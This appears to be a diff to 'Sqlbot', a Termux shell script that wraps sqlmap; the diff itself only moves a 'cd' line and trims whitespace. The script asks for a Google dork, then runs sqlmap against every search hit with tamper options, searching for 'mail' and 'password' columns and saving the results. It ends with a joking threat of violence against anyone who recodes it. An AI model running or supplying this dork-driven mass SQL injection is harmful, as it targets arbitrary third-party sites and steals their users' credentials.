@@ -8,7 +8,6 @@ pkg install toilet -y
 pkg install figlet -y
 pkg install git -y
 git clone https://github.com/sqlmapproject/sqlmap
-cd sqlmap
 blue='\033[34;1m'
 green='\033[32;1m'
 purple='\033[35;1m'
@@ -18,6 +17,7 @@ white='\033[37;1m'
 yellow='\033[33;1m'
 sleep 1
 toilet -f graffiti.flf Sqlbot --gay
+cd sqlmap
 echo ""
 echo "<==========================================>"
 echo $purple "Coder : Fajar Firdaus"
@@ -92,11 +92,11 @@ read -p "<==========> Masukan Dork : <==========>" dork
 python2 sqlmap.py -g $dork --dbs --tamper=space2comment --tamper=space2comment --search -C mail,password --keep-alive --level=2 --risk=2 --flush-session --smart --output=CC
 
 if [ $bcd = 0 ] || [ $bcd = 00 ]
-then 
-clear 
+then
+clear
 sleep 1
 echo "Terimakasih Telah Menggunakan Tools ini :)"
-sleep 2 
+sleep 2
 echo "Recode Gw bacok lo !!!!!!!"
 exit
-fi 
+fi
